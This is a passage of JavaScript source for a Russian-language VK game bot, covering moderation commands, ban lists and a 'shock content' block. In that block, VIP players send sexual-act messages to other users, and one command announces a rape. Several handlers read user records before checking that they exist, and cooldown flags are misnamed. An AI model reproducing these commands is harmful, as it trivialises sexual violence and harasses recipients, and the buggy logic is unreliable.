	return message.send(`@id${user.id}(${user.prefix}), Вы выдали игроку ${acc.users[message.$match[1]].prefix} Блокировку на ${time/60000} минут.`); 
});



vk.updates.hear(/^(?:warn)\s?([0-9]+)?\s([^]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.level < 2) return;
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1] || !message.$match[2]) return message.send(` @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: Warn [ID] [Причина предупреждения]. \n Warn Это -- Выдача предупреждение игроку [После выдачи 3х предупреждений, аккаунт игрока будет заблокирован].`);
	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
	if(acc.users[message.$match[1]].ban == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Аккаунт игрока ${acc.users[message.$match[1]].prefix} Уже заблокирован навсегда.`);
	if(!acc.users[message.$match[1]]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
	if(message.$match[1] == 2) return message.send(`Уважаемый @id${user.id}(Администратор), к сожалению @id287908009 (Разработчику) невозможно выдать Предупреждение`);
	if(acc.users[message.$match[1]].unban == true) return message.send(`У пользователя ${acc.users[message.$match[1]].prefix} стоит Анти-WARN!`);
	acc.users[message.$match[1]].warn += 1;
	acc.users[message.$match[1]].warn_p.push(message.$match[2]);
	logs(user_id(message.user), message.$match[1], message.$match[2], type = 6)

	var is = [user_id(message.user), message.text] 
	adm_log(is)

	let text = `Администратор: ${user.prefix}, выдал вам -- 1 Предупреждение.\n -- Комментарий Администратора: ${message.$match[2]}.\n\n После 3/3 Предупреждений ваш аккаунт будет заблокирован навсегда.\n -- [Система]: Снятие всех предупреждеий стоит 20₽ -- По поводу преобретения, писать @id287908009 (Основателю).`
	if(acc.users[message.$match[1]].warn == 3){
		acc.users[message.$match[1]].ban = true;
		acc.users[message.$match[1]].warn_p = []
		acc.users[message.$match[1]].level = 0
		acc.users[message.$match[1]].rub = 0
		acc.users[message.$match[1]].donate = 0
		text += `\n🔸 @id${user.id}(${user.prefix}), Вы получили 3/3 Предупреждения.\n -- Ваш аккаунт был заблокирован навсегда.\n\n -- [Система]: Снятие перманентной блокировки стоит 100₽ -- По поводу преобретения, писать @id287908009 (Основателю).`
	}
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: text,			random_id: 0
	});
	user.ainfo.warns += 1;
	return message.send(`@id${user.id}(${user.prefix}), Вы выдали игроку ${acc.users[message.$match[1]].prefix} Предупреждение.\n -- Причина предупреждения: ${message.$match[2]} \n -- У игрока ${acc.users[message.$match[1]].warn}/3 предупреждений.`);
});




vk.updates.hear(/^(?:AVIG)\s?([0-9]+)?\s([^]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.full == false) return;
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1] || !message.$match[2]) return message.send(` @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: Avig [ID Администратора] [Причина Выговора]. \n Avig Это -- Выдача Административного выговора Администратору [После выдачи 3х выговоров, Администратор будет снят.].`);
	if(acc.users[message.$match[1]].ban == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Аккаунт игрока ${acc.users[message.$match[1]].prefix} заблокирован навсегда.`);
	if(acc.users[message.$match[1]].level == 0) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Игрок ${acc.users[message.$match[1]].prefix} не Администратор`);
	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
	if(message.$match[1] == 2) return message.send(`Уважаемый @id${user.id}(Основатель), к сожалению @id287908009 (Разработчику) невозможно выдать выговор`);
	if(acc.users[message.$match[1]].unban == true) return message.send(`У пользователя ${acc.users[message.$match[1]].prefix} стоит Анти-AVIG!`);
	acc.users[message.$match[1]].ainfo.vig += 1; 

	var is = [user_id(message.user), message.text] 
	adm_log(is)

	let text = `Основатель ${user.prefix} выдал вам 1 Административный выговор.\n -- Комментарий Основателя: ${message.$match[2]}\n\n -- [Подсказка]: При 3/3 Аккаунт преобретает статус: Игрок. `
	if(acc.users[message.$match[1]].ainfo.vig == 3){  
		acc.users[message.$match[1]].level = 0;
		text += `\n🔸 @id${user.id}(${user.prefix}), Вы получили 3/3 Административных выговора..\n -- Ваш аккаунт преобрёл статус: Игрок.`
	}
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: text,			random_id: 0
	}); 
	return message.send(`@id${user.id}(${user.prefix}), Вы выдали Административный выговор Администратору: ${acc.users[message.$match[1]].prefix}.\n Причина Выговора: ${message.$match[2]}\n -- У Него ${acc.users[message.$match[1]].ainfo.vig}/3 Выговоров. \n\n -- [Подсказка]: При 3/3 Аккаунт преобретает статус: Игрок. `);
}); 



vk.updates.hear(/^(?:пбан)\s?([0-9]+)?\s([^]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(user.level < 4) return;
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: пбан [ID] [Причина наказания]. `);
	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
	if(acc.users[message.$match[1]].ban == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Аккаунт игрока ${acc.users[message.$match[1]].prefix} уже имеет перманентную блокировку\n Для разблокировки, используйте: UnPermBan ${message.$match[1]}.`);
	if(!acc.users[message.$match[1]]) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
	if(acc.users[message.$match[1]].unban == true) return message.send(`У пользователя ${acc.users[message.$match[1]].prefix} стоит Анти-PERMBAN!`);
	acc.users[message.$match[1]].block_pay = true;    
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Администратор: ${user.prefix}, Заблокировал вам передачу валюты.\n -- Комментарий Администратора: ${message.$match[2]}.`,			random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`@id${user.id}(${user.prefix}), Вы заблокировали игроку ${acc.users[message.$match[1]].prefix} передачу валютты\n -- Причина блокировки: ${message.$match[2]}.`);
});



vk.updates.hear(/^(?:гбан)\s?([0-9]+)?\s([^]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(user.level < 4) return;
	let args = message.$match[1];
	if(acc.users[message.$match[1]].level == 0) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Игрок ${acc.users[message.$match[1]].prefix} не Администратор`);
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: гбан [ID] [Причина наказания]. `);
	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Администратора должен быть цифрового вида.`);
	if(acc.users[message.$match[1]].ban == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Аккаунт Игрока ${acc.users[message.$match[1]].prefix} уже имеет перманентную блокировку\n Для разблокировки, используйте: UnPermBan ${message.$match[1]}.`);
	if(!acc.users[message.$match[1]]) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Администратор не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
	if(acc.users[message.$match[1]].unban == true) return message.send(`У пользователя ${acc.users[message.$match[1]].prefix} стоит Анти-PERMBAN!`);
	acc.users[message.$match[1]].block_give = true;     
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Администратор: ${user.prefix}, Заблокировал вам возможность выдачи валюты [GIV].\n -- Комментарий Администратора: ${message.$match[2]}.`,			random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`@id${user.id}(${user.prefix}), Вы заблокировали Администратору ${acc.users[message.$match[1]].prefix} возможность выдачи валюты [GIV]\n -- Причина блокировки: ${message.$match[2]}.`);
});




vk.updates.hear(/^(?:рбан)\s?([0-9]+)?\s([^]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(user.level < 4) return;
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: рбан [ID] [Причина наказания]. `);
	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
	if(acc.users[message.$match[1]].ban == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Аккаунт игрока ${acc.users[message.$match[1]].prefix} уже имеет перманентную блокировку\n Для разблокировки, используйте: UnPermBan ${message.$match[1]}.`);
	if(!acc.users[message.$match[1]]) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
	if(acc.users[message.$match[1]].unban == true) return message.send(`У пользователя ${acc.users[message.$match[1]].prefix} стоит Анти-PERMBAN!`);
	acc.users[message.$match[1]].block_rep = true;    
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Администратор: ${user.prefix}, Заблокировал вам возможность писать жалобы в репорт.\n -- Комментарий Администратора: ${message.$match[2]}.`,			random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`@id${user.id}(${user.prefix}), Вы заблокировали игроку ${acc.users[message.$match[1]].prefix} возможность писать в репорт\n -- Причина блокировки: ${message.$match[2]}.`);
});
// Выдача наказаний:


// Досрочное снятие наказаний:

vk.updates.hear(/^(?:unban)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.level < 3) return;
	if(acc.users[message.$match[1]].ban == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Аккаунт игрока ${acc.users[message.$match[1]].prefix} заблокирован навсегда!`);
	if(acc.users[message.$match[1]].mute == false) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Аккаунт игрока ${acc.users[message.$match[1]].prefix} Не имеет временную блокировку.`);
	if(!message.$match[1]) return message.send(` @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: UnBan [ID Заблокированного пользователя] \n UnBan Это -- Команда для снятия временной блокировки. [Аккаунт пользователя будет досрочно разблокирован].`);
	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
	var is = [user_id(message.user), message.text] 
	adm_log(is)

	acc.users[message.$match[1]].mute = false;  
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `[Система @bot.anya (Бот Анна)]: С вашего аккаунта досрочно была снята временная блокировка. \n -- Больше не нарушайте :)`,			random_id: 0
	});
	return message.send(`@id${user.id}(${user.prefix}), Вы Досрочно сняли временную блокировку игроку ${acc.users[message.$match[1]].prefix}`);	 
});

vk.updates.hear(/^(?:unpermban)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.level < 3) return;
	if(!message.$match[1]) return message.send(` @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: UnpERMBan [ID Заблокированного пользователя] \n UnPermBan Это -- Команда для снятия перманентной блокировки. [Аккаунт пользователя будет разблокирован].`);
	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
	if(acc.users[message.$match[1]].ban == false) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Аккаунт игрока ${acc.users[message.$match[1]].prefix} Не заблокирован навсегда!`);
	if(acc.users[message.$match[1]].mute == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Аккаунт игрока ${acc.users[message.$match[1]].prefix} Не заблокирован навсегда.\n -- Но имеет временную блокировку.`);
	if(!acc.users[message.$match[1]]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
	acc.users[message.$match[1]].ban = false 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `[Система @bot.anya (Бот Анна)]: С вашего аккаунта была снята перманентная блокировка.\n -- Больше не нарушай :)`,			random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`@id${user.id}(${user.prefix}), Вы сняли игроку ${acc.users[message.$match[1]].prefix} перманентную блокировку.`);
});  

vk.updates.hear(/^(?:unwarn)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.level < 3) return;
	if(!message.$match[1]) return message.send(` @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: UnWarn [ID пользователя c предупреждениями] \n UnWarn Это -- Команда для снятия всех предупреждений игроку. [Все предупреждения будут сняты с аккаунта игрока].`);
	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
	if(acc.users[message.$match[1]].ban == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Аккаунт игрока ${acc.users[message.$match[1]].prefix} заблокирован навсегда!`);
	if(acc.users[message.$match[1]].warn == 0) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- У Игрока ${acc.users[message.$match[1]].prefix} 0/3 Предупреждений.`);
	if(!acc.users[message.$match[1]]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);

	acc.users[message.$match[1]].warn = 0; 
	acc.users[message.$match[1]].warn_p = []

	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `[Система @bot.anya (Бот Анна)]: С вашего аккаунта были сняты все предупреждения.\n -- Больше не нарушай :)`,			random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`@id${user.id}(${user.prefix}), Вы сняли игроку ${acc.users[message.$match[1]].prefix} все предупреждения.`);
}); 


vk.updates.hear(/^(?:unavig)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.full == false) return;
	if(!message.$match[1]) return message.send(` @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: UnAvig [ID пользователя c выговорами] \n UnAvig Это -- Команда для снятия всех Административных выговоров Администратору. [Все выговоры будут сняты с аккаунта Администратора].`);
	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
	if(acc.users[message.$match[1]].ban == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Аккаунт игрока ${acc.users[message.$match[1]].prefix} заблокирован навсегда.`);
	if(acc.users[message.$match[1]].level == 0) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Игрок ${acc.users[message.$match[1]].prefix} не Администратор`);
	if(acc.users[message.$match[1]].ainfo.vig == 0) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- У Игрока ${acc.users[message.$match[1]].prefix} 0/3 Административных выговоров.`);
	if(!acc.users[message.$match[1]]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);

	acc.users[message.$match[1]].ainfo.vig = 0; 

	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `[Система @bot.anya (Бот Анна)]: С вашего аккаунта были сняты все Административные выговора.\n -- Больше не нарушай :)`,			random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`@id${user.id}(${user.prefix}), Вы сняли игроку ${acc.users[message.$match[1]].prefix} все Административные Выговора.`);
}); 


vk.updates.hear(/^(?:unpban)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`Пример команды: unpban ID`);
	if(!Number(message.$match[1])) return message.send(`Число должно быть цифрового вида.`);
	if(user.level < 3) return;
	if(!acc.users[message.$match[1]]) return message.send(`Такого игрока нет!`);
	acc.users[message.$match[1]].block_pay = false 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Администратор: ${user.prefix} разблокировал вам передачи валюты.`,	random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Вы разблокировали игроку [${acc.users[message.$match[1]].prefix}] доступ к передачи валюты`);
}); 



vk.updates.hear(/^(?:ungban)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.level < 4) return;
	if(acc.users[message.$match[1]].level == 0) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Игрок ${acc.users[message.$match[1]].prefix} не Администратор`);
	if(!message.$match[1]) return message.send(` @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: Ungban [ID Заблокированного Администратора]`);
	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Администратора должен быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Администратор не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
	acc.users[message.$match[1]].block_give = false 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `[Система @bot.anya (Бот Анна)]: Вам была разблокированна возможность выдачи валюты. [giv]\n -- Больше не нарушайте :)`,			random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`@id${user.id}(${user.prefix}), Вы разблокировали Администратору ${acc.users[message.$match[1]].prefix} возможность выдачи валюты [giv].`);
}); 




vk.updates.hear(/^(?:unrban)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.level < 4) return;
	if(!message.$match[1]) return message.send(` @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: Unrban [ID Заблокированного пользователя]`);
	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
	acc.users[message.$match[1]].block_rep = false 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `[Система @bot.anya (Бот Анна)]: Вам была разблокированна возможность писать жалобы в репорт.\n -- Больше не нарушайте :)`,			random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`@id${user.id}(${user.prefix}), Вы разблокировали игроку ${acc.users[message.$match[1]].prefix} возможность писать в репорт.`);
});  


// Досрочное снятие наказаний:

//// Просморт наказуемых:
vk.updates.hear(/^(?:banlist)/i, message => { 	
	let devs, admins, moders, vips, chat; 
	let devels = ``;
	devs = '"⛔ Заблокированные пользователи:"\n';
	for (let id in acc.users) {
		if(acc.users[id]){
			let user = acc.users[id];

			if (user.ban == 1) devs += `✳ @id${acc.users[id].id}(${acc.users[id].prefix})\n`; 
		}
	}
	let text = `\n`;
	if (devs.length != 1000) text += devs;
	return message.send(`${text}`);
});
vk.updates.hear(/^(?:nulllist)/i, message => { 	
	let devs, admins, moders, vips, chat; 
	let devels = ``;
	devs = '"⛔ У этих пользователей баланс Null$"\n'; 
	for (let id in acc.users) {
		if(acc.users[id]){
			let user = acc.users[id];

			if (user.balance == null) devs += `✳ @id${acc.users[id].id}(${acc.users[id].prefix})\n`; 
		}
	}
	let text = `\n`;
	if (devs.length != 100) text += devs;
	return message.send(`${text}`);
});
//

/////////////////////////////////////////ШОК КОНТЕНТ////////////////////////////////
vk.updates.hear(/^(?:sex|секс|заняться сексом)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: SEX [ID] ❤ `);
	if(user.block_porn == true) return message.send(`Заниматся сексом можно раз в час`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ ID Должен содержать только цифры`);
	if(user.level < 1) return message.send(`🔸 ➾ Вы не VIP-Пользователь`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Игрок не найден!`);
	if(message.$match[1] == 1) return message.send(`Уважаемый @id${user.id}(пользователь), к сожалению эту команду нельзя использовать на @id287908009 (Разработчике)!`);
	var is = [user_id(message.user), message.text] 
	user.block_por = true;
	setTimeout(() => {
		user.block_porn = false;
	}, 3600000);
	let text = `❤ Игрок ${user.prefix} занялся с вами самым незабываемым Сексом ❤`
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: text,			random_id: 0
	}); 
	return message.send(`❤ @id${user.id}(${user.prefix}), вы занялись Сексом с [${acc.users[message.$match[1]].prefix}]`);
}); 

vk.updates.hear(/^(?:kuni|куни|сделать куни)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: KUNI [ID] ❤ `);
	if(user.block_porn == true) return message.send(`Делать куни можно раз в час`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ ID Должен содержать только цифры`);
	if(user.level < 1) return message.send(`🔸 ➾ Вы не VIP-Пользователь`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Игрок не найден!`);
	if(message.$match[1] == 1) return message.send(`Уважаемый @id${user.id}(пользователь), к сожалению эту команду нельзя использовать на @id287908009 (Разработчике)!`);
	var is = [user_id(message.user), message.text] 
	user.block_porn = true;
	setTimeout(() => {
		user.block_porn = false;
	}, 3600000);
	let text = `❤ ➾ Игрок ${user.prefix} сделал тебе самый незабываемый куни ❤`
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: text,			random_id: 0
	}); 
	return message.send(`❤ @id${user.id}(${user.prefix}), вы сделали куни игроку [${acc.users[message.$match[1]].prefix}]`);
}); 

vk.updates.hear(/^(?:minet|минет|сделать минет)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: MINET [ID] ❤ `);
	if(user.block_porn == true) return message.send(`Делать минет можно раз в час`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ ID Должен содержать только цифры`);
	if(user.level < 1) return message.send(`🔸 ➾ Вы не VIP-Пользователь`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Игрок не найден!`);
	if(message.$match[1] == 1) return message.send(`Уважаемый @id${user.id}(пользователь), к сожалению эту команду нельзя использовать на @id287908009 (Разработчике)!`);
	var is = [user_id(message.user), message.text] 
	user.block_porn = true;
	setTimeout(() => {
		user.block_porn = false;
	}, 3600000);
	let text = `❤ ➾ ${user.prefix} сделала тебе самый незабываемый Минет ❤`
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: text,			random_id: 0
	}); 
	return message.send(`❤ @id${user.id}(${user.prefix}), вы сделали минет игроку [${acc.users[message.$match[1]].prefix}]`);
}); 

vk.updates.hear(/^(?:kiss|поцеловать)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: KISS [ID] ❤ `);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ ID Должен содержать только цифры`);
	if(user.level < 1) return message.send(`🔸 ➾ Вы не VIP-Пользователь`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Игрок не найден!`);
	if(message.$match[1] == 2) return message.send(`Уважаемый @id${user.id}(пользователь), к сожалению эту команду нельзя использовать на @id287908009 (Разработчике)!`);
	var is = [user_id(message.user), message.text] 
	user.block_porn = true;
	setTimeout(() => {
		user.block_porn = false;
	}, 3600000);
	let text = `❤ ➾ Игрок ${user.prefix} Поцеловал(а) тебя ❤`
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: text,			random_id: 0
	}); 
	return message.send(`❤ @id${user.id}(${user.prefix}), вы поцеловали [${acc.users[message.$match[1]].prefix}]`);
}); 

vk.updates.hear(/^(?:iznas|изнасиловать)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: iznas [ID] ❤ `);
	if(user.bloks_poern == true) return message.send(`Насиловать можно раз в час`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ ID Должен содержать только цифры`);
	if(user.level < 1) return message.send(`🔸 ➾ Вы не VIP-Пользователь`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Игрок не найден!`);
	if(message.$match[1] == 1) return message.send(`Уважаемый @id${user.id}(пользователь), к сожалению эту команду нельзя использовать на @id287908009 (Разработчике)!`);

	var is = [user_id(message.user), message.text] 
	user.block_porn = true;
	user.block_porn = true;
	setTimeout(() => {
		user.block_porn = false;
	}, 3600000);
	let text = `❤ Игрок ${user.prefix} изнасиловал вас.. 😨`
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: text,			random_id: 0
	}); 
	return message.send(` ❤ @id${user.id}(${user.prefix}), вы изнасиловали [${acc.users[message.$match[1]].prefix}]`);
}); 

///////////////////////////////////ШОК КОНТЕНТ///////////////////////////////////////

//ФД


/* Виджет в группу
async function updateWidget() {
	console.log("Обновляю виджет...")
	var tops = []
	for (i=1;i<200000;i++) { 
		if(acc.users[i]) { 
			if(acc.users[i].level < 2 && acc.users[i].block_top == false) { 
				tops.push({id: i, idvk: acc.users[i].id, lvl: acc.users[i].global_exs}); 
			}
		} 
	}
	tops.sort(function(a, b) { 
		if (b.lvl > a.lvl) return 1 
			if (b.lvl < a.lvl) return -1 
				return 0 
		})

	var script = {
		title: `Топ лучших игроков`, 
		head: [

		{
			text: 'Ник'
		},

		{
			text: 'Деньги',
			align: 'right'
		},

		{
			text: 'Рейтинг',
			align: 'right'
		}
		],
		body: []
	}

	for (var g = 0; g < 10; g++) { 
		if (tops.length > g) { 
			let ups = g; 
			ups += 1; 
			if(g <= 8) ups = `${ups}`
				if(g == 9) ups = `10` 
					script.body.push([

					{
						icon_id: `id${tops[g].idvk}`,
						text: `${acc.users[tops[g].id].prefix}`,
						url: `vk.com/id${tops[g].idvk}`
					},

					{
						text: `${spaces(acc.users[tops[g].id].balance)}$`
					},

					{
						text: `👑${spaces(tops[g].lvl)}`
					},
					])
			} 
		}
